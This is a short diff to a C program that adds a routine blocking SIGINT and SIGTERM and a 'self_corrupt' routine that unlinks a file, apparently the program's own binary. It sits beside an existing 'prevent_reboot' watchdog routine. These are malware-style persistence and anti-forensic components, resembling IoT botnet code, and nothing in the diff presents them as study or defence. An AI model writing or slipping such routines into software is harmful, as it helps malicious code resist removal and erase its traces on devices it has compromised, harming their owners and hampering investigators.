@@ -24,9 +24,21 @@
 
 #define _GNU_SOURCE
 
+#include <signal.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
+
+void prevent_termination()
+{
+    sigset_t block_set;
+    sigemptyset(&block_set);
+
+    sigaddset(&block_set, SIGINT);
+    sigaddset(&block_set, SIGTERM);
+
+    sigprocmask(SIG_BLOCK, &block_set, NULL);
+}
 
 void prevent_reboot()
 {
@@ -41,4 +53,9 @@ void prevent_reboot()
         close(wfd);
         wfd = 0;
     }
+}
+
+void self_corrupt(char *filename)
+{
+    unlink(filename);
 }
